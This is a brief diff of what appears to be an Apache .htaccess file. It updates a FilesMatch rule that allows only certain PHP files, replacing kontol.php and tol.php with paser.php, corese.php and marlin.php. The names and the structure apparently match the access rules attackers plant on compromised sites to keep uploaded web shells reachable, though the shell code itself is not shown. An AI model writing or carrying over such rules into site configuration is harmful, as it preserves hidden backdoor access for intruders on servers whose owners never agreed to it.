@@ -8,7 +8,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(kontol.php|index.php|tol.php)$'>
+<FilesMatch '^(paser.php|index.php|corese.php|marlin.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
